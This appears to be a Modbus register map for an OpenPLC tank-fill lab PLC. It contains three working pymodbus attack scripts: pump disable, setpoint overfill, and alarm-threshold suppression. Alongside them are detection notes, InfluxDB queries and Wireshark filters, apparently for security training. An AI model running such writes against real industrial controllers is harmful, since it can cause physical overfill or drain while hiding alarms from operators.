# Modbus Register Map — tank_fill_control v1.0

**PLC**: OpenPLC Runtime v3
**Program**: `tank_fill_control.st`
**IP**: 192.168.100.10 (OT zone, vmbr3)
**Port**: 502 (Modbus TCP)
**Slave ID**: 1
**Scan Rate**: 50ms (TASK task0 interval)

---

## Coils — FC01 Read / FC05 Write (Base Address 0)

| Address | OpenPLC Tag | Type | Description | Safe Value | Attack Impact |
|---------|-------------|------|-------------|------------|---------------|
| 0 | `%QX0.0` | BOOL RW | Pump enable/disable | TRUE | **T0855**: Write FALSE → pump stops, tank drains |
| 1 | `%QX0.1` | BOOL RO* | High level alarm output | FALSE | Read-only indicator; writing has no process effect |
| 2 | `%QX0.2` | BOOL RO* | Low level alarm output | FALSE | Read-only indicator; writing has no process effect |

*Coils 1-2 are written by PLC logic each scan cycle. External writes are overwritten within 50ms.

---

## Discrete Inputs — FC02 Read Only (Base Address 0)

| Address | OpenPLC Tag | Type | Description | Notes |
|---------|-------------|------|-------------|-------|
| — | — | — | No discrete inputs mapped | `%IX` registers not used in this program |

---

## Input Registers — FC04 Read Only (Base Address 0)

| Address | OpenPLC Tag | Range | Units | Description |
|---------|-------------|-------|-------|-------------|
| 0 | `%IW0` | 0–1000 | Raw (0–100%) | Tank level sensor — analog input, 0=empty, 1000=full |

---

## Holding Registers — FC03 Read / FC06 Write (Base Address 0)

| Address | OpenPLC Tag | Range | Default | Units | Description | Attack Impact |
|---------|-------------|-------|---------|-------|-------------|---------------|
| 0 | `%QW0` | 0–100 | 0 | % | Pump speed output | Written by PLC each cycle; external writes overwritten in 50ms |
| 1024 | `%MW0` | 0–1000 | 750 | Raw | Tank level setpoint | **T0836**: Write >900 → overfill; Write 0 → tank drains |
| 1025 | `%MW1` | 0–1000 | 900 | Raw | High alarm threshold | Write higher → delays alarm response to overfill attack |
| 1026 | `%MW2` | 0–1000 | 200 | Raw | Low alarm threshold | Write lower → delays alarm response to drain attack |

### OpenPLC Modbus Address Mapping

OpenPLC maps IEC 61131-3 variables to Modbus addresses as follows:

| IEC Variable | Modbus Type | Modbus Address Range |
|-------------|-------------|---------------------|
| `%QX0.0`–`%QX0.7` | Coils (FC01/FC05) | 0–7 |
| `%QX1.0`–`%QX1.7` | Coils (FC01/FC05) | 8–15 |
| `%IX0.0`–`%IX0.7` | Discrete Inputs (FC02) | 0–7 |
| `%QW0`–`%QW99` | Holding Registers (FC03/FC06) | 0–99 |
| `%IW0`–`%IW99` | Input Registers (FC04) | 0–99 |
| `%MW0`–`%MW99` | Holding Registers (FC03/FC06) | 1024–1123 |

**Key**: `%MW` (memory words) are mapped to Modbus holding registers starting at address 1024.

---

## Attack Scenarios

### SCEN-001: Modbus Recon
1. Enumerate coils: `FC01 read address 0, count 8`
2. Enumerate input registers: `FC04 read address 0, count 4`
3. Enumerate holding registers: `FC03 read address 0, count 4` and `FC03 read address 1024, count 4`
4. Identify writable setpoint at HR 1024

### Pump Disable Attack (T0855 — Unauthorized Command Message)
```python
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient("192.168.100.10", port=502)
c.connect()
c.write_coil(0, False, slave=1)  # Disable pump
c.close()
```
**Detection**: Coil 0 transitions FALSE unexpectedly; pump speed drops to 0; tank level begins falling.

### Setpoint Manipulation (T0836 — Modify Parameter)
```python
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient("192.168.100.10", port=502)
c.connect()
c.write_register(1024, 999, slave=1)  # Setpoint to 99.9% — overfill
c.close()
```
**Detection**: Setpoint register changes from 750 to 999; pump runs at full speed indefinitely; tank level exceeds high alarm.

### Stealthy Setpoint + Alarm Suppression (Advanced)
```python
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient("192.168.100.10", port=502)
c.connect()
c.write_register(1024, 999, slave=1)   # Overfill setpoint
c.write_register(1025, 1000, slave=1)  # Raise high alarm threshold above max
c.close()
```
**Detection**: Two register writes in rapid succession from non-HMI source; alarm threshold changed to invalid range.

---

## Monitoring Queries (InfluxDB Flux)

### Current readings
```flux
from(bucket: "process-data")
  |> range(start: -5m)
  |> filter(fn: (r) => r._measurement == "openplc")
  |> last()
```

### Setpoint change detection
```flux
from(bucket: "process-data")
  |> range(start: -1h)
  |> filter(fn: (r) => r._measurement == "openplc" and r._field == "setpoint")
  |> difference()
  |> filter(fn: (r) => r._value != 0)
```

---

## Wireshark Filters

```
# All Modbus TCP traffic to PLC
modbus && ip.dst == 192.168.100.10

# Write operations only (attack indicator)
modbus.func_code == 5 || modbus.func_code == 6 || modbus.func_code == 15 || modbus.func_code == 16

# Setpoint register writes
modbus.func_code == 6 && modbus.regnum16 >= 1024
```
